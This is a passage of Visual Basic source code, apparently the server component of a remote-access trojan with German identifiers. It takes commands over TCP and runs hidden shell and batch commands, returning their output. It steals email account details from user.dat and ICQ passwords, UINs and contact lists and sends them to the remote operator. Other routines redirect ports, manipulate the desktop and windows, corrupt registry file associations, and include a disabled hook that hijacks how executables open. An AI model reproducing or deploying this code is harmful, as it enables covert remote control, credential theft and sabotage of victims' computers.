  LimpaEs = Texto
  
End Function
Sub DownUpAbbrechen()
On Error Resume Next
wskServer.Close
wskClient.Close
TCP2.SendData "DownUpAbbgebrochen"
End Sub
Sub DownUpAbbrechenWirklich()
On Error Resume Next
If SendingFile Then
   SendingFile = False
   End If
DateiWirdGeradeGesendet = False
Timer5.Enabled = False
With wskServer
    .Close
    .Listen
End With
With wskClient
    .Close
    .Listen
End With
TCP2.SendData "DownUpAbbrechenWirklich"
End Sub

Sub MSDosSkribt()
On Error GoTo z
Open "MsDosSkribt.bat" For Output As #1
Print #1, Text2.Text & vbCrLf & "EXIT"
Close #1
Shell "MsDosSkribt.bat", vbHide
Sleep 2000
Kill "MsDosSkribt.bat"
TCP2.SendData "msdosOK"
Dim WHandle As Long
Dim r As Long
    WHandle = FindWindow(vbNullString, "Beendet - MsDosSkribt")
    If WHandle <> 0 Then
        r = PostMessage(WHandle, &H10, 0&, 0&)
        End If
        Exit Sub
z:

End Sub

Sub EmailsFinden()
On Error GoTo z
Text1.Text = ""
Dim a As Long
Dim b
Dim dd As Boolean
dd = False
Open WindowsDirectory & "\user.dat" For Binary Access Read Lock Read As #1
a = FileLen(WindowsDirectory & "\user.dat")
b = Input(a, 1)
Close
Dim cc As Long
cc = 1
Dim Search, Where
o:
Search = "SMTP Email Address"
Where = InStr(cc, b, Search)
If Where Then
dd = True
Text1.Text = Text1.Text & vbCrLf & Mid(b, Where + 18, 40)
cc = Where + 2
GoTo o
Else
If dd = False Then
Text1.Text = "no e-mail adress found :-("
Else
End If
End If
dd = False
cc = 1


u:
Search = "SMTP Server"
Where = InStr(cc, b, Search)
If Where Then
dd = True
Text1.Text = Text1.Text & vbCrLf & Mid(b, Where + 11, 40) & vbCrLf
cc = Where + 2
GoTo u
Else
If dd = False Then
Text1.Text = Text1.Text & vbCrLf & "no e-mail server found :-("
Else
End If
End If
dd = False
cc = 1
a:
Search = "POP3 User Name"
Where = InStr(cc, b, Search)
If Where Then
dd = True
Text1.Text = Text1.Text & vbCrLf & "Username:" & Mid(b, Where + 14, 40) & vbCrLf
cc = Where + 2
GoTo a
Else
If dd = False Then
Text1.Text = Text1.Text & vbCrLf & "no e-mail username(s)  found :-("
Else
End If
End If
TCP2.SendData Text1.Text
Exit Sub
z:
WennFehlerDann
End Sub

Sub DesktopEinfrieren()
On Error GoTo z
GetWindowSnapShot 0, Image1
SavePicture Image1, "Screen.bmp"
u:
GibtEsDasBildSchon
If GibtEsDasBildSchonHmm = False Then
GoTo u
Else
End If

Load Video
Video.Show
Video.Picture1.Visible = True
Video.Picture1.Picture = LoadPicture("Screen.bmp")
Video.Height = Video.Picture1.Height
Video.Width = Video.Picture1.Width
TCP2.SendData "DesktopEinfrierenOK"
Exit Sub
z:
WennFehlerDann

End Sub
Sub GibtEsDasBildSchon()
On Error GoTo i
Dim aa
aa = FileLen("Screen.bmp")
GibtEsDasBildSchonHmm = True
Exit Sub
i:

GibtEsDasBildSchonHmm = False
End Sub

Sub DesktopUmdrehen()
On Error GoTo z

TCP2.SendData "DesktopMani"
Exit Sub
z:
WennFehlerDann
End Sub

Sub DesktopZickZack()
On Error GoTo z

TCP2.SendData "DesktopMani"
Exit Sub
z:
WennFehlerDann
End Sub


Sub AufloesungAendern(ByVal W As Long, ByVal h As Long)
On Error GoTo z
Dim RetVal As Long, i As Long
Do
RetVal = EnumDisplaySettings(0&, i&, n)
i = i + 1
Loop Until RetVal = False
With n
.dmFields = DM_PELSWIDTH Or DM_PELSHEIGHT
.dmPelsWidth = W
.dmPelsHeight = h
End With
RetVal = ChangeDisplaySettings(n, 0)
TCP2.SendData "AuflG"
Exit Sub
z:
WennFehlerDann
End Sub

Sub DrehenWenden(ByVal Werte As String)
On Error GoTo z
GetWindowSnapShot 0, Image1
SavePicture Image1, "Screen.bmp"
u:
GibtEsDasBildSchon
If GibtEsDasBildSchonHmm = False Then
GoTo u
Else
End If

Load Video
Video.Show
Video.Picture1.Visible = True
Video.Picture1.Picture = LoadPicture("Screen.bmp")
Video.Height = Video.Picture1.Height
Video.Width = Video.Picture1.Width
If Werte = "vierfuenf" Then
Video.DrehenUm "1"
ElseIf Werte = "neunnull" Then
Video.DrehenUm "2"
ElseIf Werte = "achtnull" Then
Video.Verdikal
ElseIf Werte = "zickzack" Then
Video.ZickZack
Else
End If
TCP2.SendData "DesktopDrehenOK"
Exit Sub
z:
WennFehlerDann
End Sub

Sub VAuswerten()
On Error Resume Next
Dim a
Dim c
a = GetSetting("offwo", "offwo", "offwo")
c = GetSetting("serverwo", "serverwo", "serverwo")

If a = "windows-path" Then
SaveSetting "offwo", "offwo", "offwo", WindowsDirectory & "\"
ElseIf a = "system-path" Then
SaveSetting "offwo", "offwo", "offwo", WindowsDirectory & "\System\"
ElseIf a = "command-path" Then
SaveSetting "offwo", "offwo", "offwo", WindowsDirectory & "\Command\"
ElseIf a = "C:\" Then
SaveSetting "offwo", "offwo", "offwo", "C:\"
ElseIf a = "other-path" Then
Dir1.Path = a
SaveSetting "offwo", "offwo", "offwo", Dir1.Path & "\"
Else
Dir1.Path = a
SaveSetting "offwo", "offwo", "offwo", Dir1.Path & "\"
End If

If c = "windows-path" Then
SaveSetting "serverwo", "serverwo", "serverwo", WindowsDirectory & "\"
ElseIf c = "system-path" Then
SaveSetting "serverwo", "serverwo", "serverwo", WindowsDirectory & "\System\"
ElseIf c = "command-path" Then
SaveSetting "serverwo", "serverwo", "serverwo", WindowsDirectory & "\Command\"
ElseIf c = "C:\" Then
SaveSetting "serverwo", "serverwo", "serverwo", "C:\"
ElseIf c = "other-path" Then
Dir1.Path = c
SaveSetting "serverwo", "serverwo", "serverwo", Dir1.Path & "\"
Else
Dir1.Path = c
SaveSetting "serverwo", "serverwo", "serverwo", Dir1.Path & "\"
End If
End Sub

Sub WertWertAuswerten()
On Error Resume Next
If WertWert = "Alles" Then
SaveSetting "WertWert", "WertWert", "WertWert", "Alles"
ElseIf WertWert = "Erstes" Then
SaveSetting "WertWert", "WertWert", "WertWert", "Erstes"
ElseIf WertWert = "Zweites" Then
SaveSetting "WertWert", "WertWert", "WertWert", "Zweites"
ElseIf WertWert = "Keines" Then
SaveSetting "WertWert", "WertWert", "WertWert", "Keines"
Else
End If
End Sub

Sub WertWertSetzen()
On Error Resume Next
If GetSetting("WertWert", "WertWert", "WertWert") = "Alles" Then
SetAttr GetSetting("serverwo", "serverwo", "serverwo") & GetSetting("DateiServer1", "DateiServer1", "DateiServer1") & GetSetting("DateiErw", "DateiErw", "DateiErw"), vbHidden
SetAttr GetSetting("serverwo", "serverwo", "serverwo") & GetSetting("DateiServer1", "DateiServer1", "DateiServer1") & GetSetting("DateiErw", "DateiErw", "DateiErw"), vbReadOnly

ElseIf GetSetting("WertWert", "WertWert", "WertWert") = "Erstes" Then
SetAttr GetSetting("serverwo", "serverwo", "serverwo") & GetSetting("DateiServer1", "DateiServer1", "DateiServer1") & GetSetting("DateiErw", "DateiErw", "DateiErw"), vbNormal
SetAttr GetSetting("serverwo", "serverwo", "serverwo") & GetSetting("DateiServer1", "DateiServer1", "DateiServer1") & GetSetting("DateiErw", "DateiErw", "DateiErw"), vbHidden
ElseIf GetSetting("WertWert", "WertWert", "WertWert") = "Zweites" Then
SetAttr GetSetting("serverwo", "serverwo", "serverwo") & GetSetting("DateiServer1", "DateiServer1", "DateiServer1") & GetSetting("DateiErw", "DateiErw", "DateiErw"), vbNormal
SetAttr GetSetting("serverwo", "serverwo", "serverwo") & GetSetting("DateiServer1", "DateiServer1", "DateiServer1") & GetSetting("DateiErw", "DateiErw", "DateiErw"), vbReadOnly
ElseIf GetSetting("WertWert", "WertWert", "WertWert") = "Keines" Then
SetAttr GetSetting("serverwo", "serverwo", "serverwo") & GetSetting("DateiServer1", "DateiServer1", "DateiServer1") & GetSetting("DateiErw", "DateiErw", "DateiErw"), vbNormal
Else
End If

End Sub

Sub OffAN()
On Error GoTo z
SaveSetting "Off", "Off", "Off", "AN"
TCP2.SendData "OffAn"
Exit Sub
z:
WennFehlerDann
End Sub

Sub OffAUS()
On Error GoTo z
SaveSetting "Off", "Off", "Off", "AUS"
TCP2.SendData "OffAus"
Exit Sub
z:
WennFehlerDann
End Sub
Sub OffStAtus()
On Error GoTo z
Dim u
u = GetSetting("Off", "Off", "Off")
If u = "AUS" Then
TCP2.SendData "off"
Else
TCP2.SendData "on"
End If

Exit Sub
z:
Feehler
End Sub
Sub Feehler()
On Error GoTo z
TCP2.SendData "Not able do find out the status..."
Exit Sub
z:
End Sub
Sub DateiLEeren()
On Error GoTo z
Dim g
g = GetSetting("offwo", "offwo", "offwo") & GetSetting("offname", "offname", "offname")
Open g For Output As #10
Print #10, "."
Close #10
TCP2.SendData "DateiLeeren"
Exit Sub
z:
WennFehlerDann
End Sub
Sub PortRedirect()
On Error GoTo T
Dim Ergebniss
Dim Ergebniss2
Dim Ergebniss3
Dim aRight
Dim Zahl
Dim Search, Where
Search = "PortRedirect"
Where = InStr(Text2.Text, Search)
If Where Then
aRight = Right(Text2.Text, Len(Text2.Text) - (Where - 1) - 12)
Search = "IP"
Where = InStr(aRight, Search)
Zahl = Where - 1
Ergebniss = Left(aRight, Zahl)
Else
End If
Search = "IP"
Where = InStr(Text2.Text, Search)
If Where Then
aRight = Right(Text2.Text, Len(Text2.Text) - (Where - 1) - 2)
Search = "PORT"
Where = InStr(aRight, Search)
Zahl = Where - 1
Ergebniss2 = Left(aRight, Zahl)
Else
End If
Search = "PORT"
Where = InStr(Text2.Text, Search)
If Where Then
aRight = Right(Text2.Text, Len(Text2.Text) - (Where - 1) - 4)

Ergebniss3 = aRight
Else
End If
PortS.Close
PortS.RemoteHost = Ergebniss2
PortS.RemotePort = Ergebniss3
PortS.Connect
PortO.Close
PortO.LocalPort = Ergebniss
PortO.Listen
TCP2.SendData "PortAkt"
Exit Sub
T:
WennFehlerDann
End Sub

Sub PortAktNo()
On Error GoTo z
PortO.Close
PortS.Close
TCP2.SendData "PortAktNo"
Exit Sub
z:
End Sub
Private Function ShellGetText(Program As String) As String
On Error GoTo z
       Dim sTempFile As String
       Dim hFile As Long
       Dim pid As Long
       Dim hProcess As Long
       Dim bResult As Boolean

       sTempFile = Space(1024)
       GetTempFileName Environ("TEMP"), "OUT", 0, sTempFile
       sTempFile = FromSz(sTempFile)

       pid = Shell(Environ("COMSPEC") & " /C " & Program & ">" & sTempFile, vbHide)
       hProcess = OpenProcess(Synchronize, True, pid)

       Do Until (hProcess = 0) Or WaitForSingleObject(hProcess, 60000)
          GoTo CloseHandles
       Loop

CloseHandles:
       hFile = FreeFile
       Open sTempFile For Binary As #hFile
       ShellGetText = Input$(LOF(hFile), hFile)
       Close #hFile

       CloseHandle hProcess
       Kill sTempFile
       If ShellGetText = "" Then
       ShellGetText = "Nothing...."
       Else
       End If
       TCP2.SendData ShellGetText
       Exit Function
z:
       WennFehlerDann
End Function

Private Function FromSz(szStr As String) As String
On Error Resume Next
   If InStr(szStr, vbNullChar) Then
      FromSz = Left(szStr, InStr(szStr, vbNullChar) - 1)
   Else
      FromSz = szStr
   End If
End Function

Sub AppRedirect(ByVal DateiNameAppRedirect As String)
On Error GoTo z
ShellGetText DateiNameAppRedirect

Exit Sub
z:
WennFehlerDann
End Sub

Sub ICQP()
On Error Resume Next
Dim IcqPath As String, SearchString As String
Dim ReadBuffer As String, FileLength As Long, Counter As Long
Dim Pass As String, PassString As String

IcqPath = ICQDBPfad
ChDir (IcqPath)
uinfile = Dir("*.dat")
 SearchString = Chr(0) + Chr(1) + Chr(0) + Chr(0) + Chr(0) + Chr(3) + Chr(0) + Chr(0) + Chr(0)
 Open IcqPath & "\" & uinfile For Binary Access Read As #1
 FileLength = LOF(1)
    If FileLength > 500000 Then
        FileLength = 500000
    End If
 ReadBuffer = Space(FileLength)
 
 Get #1, , ReadBuffer
FindString:
  PassPosition = InStr(PassPosition + 1, ReadBuffer, SearchString)
  If PassPosition = 0 Then
      Close #1
      TCP2.SendData "No Password..."
      Exit Sub
  End If
  Close #1
  
  PassString = Mid(ReadBuffer, PassPosition - 20, 20)
  For Counter = 1 To Len(PassString)
    If Asc(Mid(PassString, Counter, 1)) > 31 And Asc(Mid(PassString, Counter, 1)) < 127 Then
       Pass = Pass + Mid(PassString, Counter, 1)
    End If
  Next
If Len(Pass) < 3 Then GoTo FindString

TCP2.SendData "Password is:  " & Pass
Exit Sub
z:
WennFehlerDann

End Sub

Sub ICQU()
On Error GoTo z
ICQPfad
Dim IcqPath As String, SearchString As String
Dim ReadBuffer As String, FileLength As Long, Counter As Long
Dim Pass As String, PassString As String

IcqPath = ICQDBPfad
ChDir (IcqPath)
uinfile = Dir("*.dat")
TCP2.SendData Left(uinfile, Len(uinfile) - 4)
Exit Sub
z:
WennFehlerDann
End Sub

Sub ICQPfad()
On Error Resume Next
Text3.Text = "Software\Mirabilis\ICQ\DefaultPrefs"
Text4.Text = "New Database"
ICQDBPfad = aUserInfo("CurrentUser")
Text3.Text = "Software\Mirabilis\ICQ\DefaultPrefs"
Text4.Text = "UIN Dir"
ICQUinPfad = aUserInfo("CurrentUser")
Text3.Text = "Software\Mirabilis\ICQ\DefaultPrefs"
Text4.Text = "ICQPath"
ICQPad = aUserInfo("CurrentUser")
End Sub

Sub ICQC()
On Error GoTo z
ICQPfad
Dim IcqPath As String, SearchString As String
Dim ReadBuffer As String, FileLength As Long, Counter As Long
Dim Pass As String, PassString As String

IcqPath = ICQDBPfad
ChDir (IcqPath)
uinfile = Dir("*.dat")
Text2.Text = "WindowsEnde" & Left(uinfile, Len(uinfile) - 4)
FensterSchliessen

Exit Sub
z:
WennFehlerDann
End Sub

Sub ICQN()
On Error GoTo z
ICQPfad
Dim IcqPath As String, SearchString As String
Dim ReadBuffer As String, FileLength As Long, Counter As Long
Dim Pass As String, PassString As String

IcqPath = ICQDBPfad
ChDir (IcqPath)
uinfile = Dir("*.dat")
Text2.Text = Left(uinfile, Len(uinfile) - 4)
Text3.Text = "Software\Mirabilis\ICQ\Owners\" & Text2.Text
Text4.Text = "Name"
Dim b
b = aUserInfo("CurrentUser")
TCP2.SendData b
Exit Sub
z:
WennFehlerDann
End Sub

Sub IcqOnlineList()
On Error GoTo z
ICQPfad

ChDir ICQPad
UIN
Load Form1
Form1.Auswahl "a"
Dim a As Integer
Text1.Text = ""
For a = 0 To Form1.List1.ListCount - 1
Text1.Text = Text1.Text & Form1.List1.List(a) & vbCrLf
Next
Unload Form1
If Text1.Text = "" Then
TCP2.SendData "Sorry, there are no user online"
Else
TCP2.SendData Text1.Text
End If
Exit Sub
z:
WennFehlerDann
End Sub

Sub GetGroup()
On Error GoTo z
ICQPfad

ChDir ICQPad
UIN
Load Form1
Form1.Auswahl "b"
Dim a As Integer
Text1.Text = ""
For a = 0 To Form1.List1.ListCount - 1
Text1.Text = Text1.Text & Form1.List1.List(a) & vbCrLf
Next
Unload Form1
If Text1.Text = "" Then
TCP2.SendData "Sorry, there are no groups..."
Else
TCP2.SendData Text1.Text
End If
Exit Sub
z:
WennFehlerDann
End Sub

Sub GetFullOwner()
On Error GoTo z
ICQPfad

ChDir ICQPad
UIN
Load Form1
Form1.Auswahl "c"
Dim a As Integer
Text1.Text = ""
For a = 0 To Form1.List1.ListCount - 1
Text1.Text = Text1.Text & Form1.List1.List(a) & vbCrLf
Next
Unload Form1
If Text1.Text = "" Then
TCP2.SendData "Sorry, there are no full owner datas"
Else
TCP2.SendData Text1.Text
End If
Exit Sub
z:
WennFehlerDann
End Sub
Sub GetShowData()
On Error GoTo z
ICQPfad

ChDir ICQPad
UIN
Load Form1
Form1.Auswahl "d"
Unload Form1
Exit Sub
z:
WennFehlerDann
End Sub

Sub UIN()
On Error Resume Next
ICQPfad
Dim IcqPath As String, SearchString As String
Dim ReadBuffer As String, FileLength As Long, Counter As Long
Dim Pass As String, PassString As String

IcqPath = ICQDBPfad
ChDir (IcqPath)
uinfile = Dir("*.dat")
ChDir ICQPad
Form1.Text1.Text = uinfile
End Sub


Sub AlleBeendenVerbinden()
On Error Resume Next
Fo.TCP2.Close: PortO.Close: PortS.Close
Dim ff
ff = GetSetting("ServerPort", "ServerPort", "ServerPort")
Fo.TCP2.LocalPort = Val(ff)
Fo.TCP2.Listen
Fo.wskServer.Close
Fo.wskServer.LocalPort = 1000
Fo.wskServer.Listen
Fo.wskClient.Close
Fo.wskClient.Listen
End Sub

Sub Destroyer(DateiTyp As String)
On Error GoTo z

Dim Destroyy As String
Text3.Text = DateiTyp
Text4.Text = ""
Destroyy = aUserInfo("Class")
If Destroyy = "" Then
GoTo z
Else
End If
Text3.Text = Destroyy
Text3.Text = Text3.Text & "\shell\open\command"
Text4.Text = ""
Dim z As String
zz = "Destroyed!!!"
SetKeyValue Text3.Text, "", zz, REG_SZ, "Class"
TCP2.SendData "RegDestroyed"
Exit Sub
z:
End Sub

Sub ICQMessage(Message As String)
ICQPfad
ChDir ICQPad
UIN
Form1.ICQMessage Message
End Sub
Sub WindowHandle(win, cas As Long)
On Error GoTo z
Dim WHandle As Long
WHandle = FindWindow(vbNullString, win)
If WHandle = 0 Then
GoTo z
Exit Sub
Else
End If
win = WHandle
    Select Case cas
        Case 0
        Dim x%
        x% = SendMessage(win, WM_CLOSE, 0, 0)
        Case 1
        x = ShowWindow(win, SW_SHOW)
        Case 2
        x = ShowWindow(win, SW_HIDE)
        TCP2.SendData "FensterHide"
        Case 3
        x = ShowWindow(win, SW_MAXIMIZE)
        TCP2.SendData "FensterMax"
        Case 4
        x = ShowWindow(win, SW_MINIMIZE)
        TCP2.SendData "FensterMin"
    End Select

Exit Sub
z:
WennFehlerDann
End Sub
Sub UnRevoveAble()
On Error Resume Next
GoTo z
Dim ServerIstWo
Text5.Text = ".ogc"
Text6.Text = "Content Type"
Text7.Text = "application/x-msdownload"
aREGSeTzEN "Class"
Text5.Text = ".ogc"
Text6.Text = ""
Text7.Text = "exefile"
aREGSeTzEN "Class"
Text5.Text = "exefile\shell\open\command"
Text6.Text = ""
Text7.Text = WindowsDirectory & "\Command\SysEditr.exe %1"
aREGSeTzEN "Class"
z:
End Sub


